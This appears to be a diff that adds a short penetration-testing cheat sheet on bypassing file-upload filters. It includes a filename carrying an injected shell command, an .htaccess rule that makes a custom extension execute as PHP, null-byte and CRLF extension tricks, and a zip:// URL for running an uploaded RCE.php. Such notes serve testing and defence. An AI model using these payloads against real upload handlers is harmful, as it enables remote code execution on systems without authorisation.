@@ -1,0 +1,46 @@
+---
+
+### **File Upload Vulnerabilities & Techniques**
+
+#### **1. Basic Techniques**
+- File Name Manipulation:
+  - 02.mp3";id;#
+  - Try uploading a text file with .png extension.
+  - Try the same with .svg and inject XML: Video Tutorial (https://youtu.be/Iq6ThCmUTOU?si=-waZobykOkxOdf8L).
+  - Try injecting XSS code in the file.
+
+#### **2. Tools for Exploitation**
+- Exif Tool: Manipulate metadata.
+- jhead: Inject headers into image files.
+- Video Tutorial: jhead (https://youtu.be/CmF9sEyKZNo?si=xpqlS0H2gpb7flmt).
+
+#### **3. .htaccess File Manipulation**
+- Add the following line to .htaccess:
+  - AddType application/x-httpd-php .l33t
+- Then upload a PHP file with .l33t extension.
+
+#### **4. File Extension Bypass Techniques**
+- file.jpg.{EXT}
+- file.{EXT}.jpg
+- file.{EXT}.xxxjpg
+- file.{EXT}%00.jpg
+- file.{EXT}\x00.jpg
+- file.{EXT}%00
+- file.{EXT}\x00
+- file.{EXT}%20
+- file.{EXT}%0d%0a.jpg
+- file.{EXT}/
+- file.{EXT}.\
+
+#### **5. ZIP File Exploitation**
+- Place RCE.php in a .zip file.
+- Upload the .zip file.
+- Access it via: http://www.target.com?file=zip://uploadedFile.zip%23RCE.php
+
+#### **6. References**
+- RCE Vulnerability in File Name: https://www.vaadata.com/blog/rce-vulnerability-in-a-file-name/
+- Shell Uploading: https://www.securityidiots.com/Web-Pentest/hacking-website-by-shell-uploading.html
+- File Upload Security Tips: https://security-tips.vincd.com/file-upload/
+- Multipart Parsers Validation Bypass: https://blog.sicuranext.com/breaking-down-multipart-parsers-validation-bypass/
+
+---
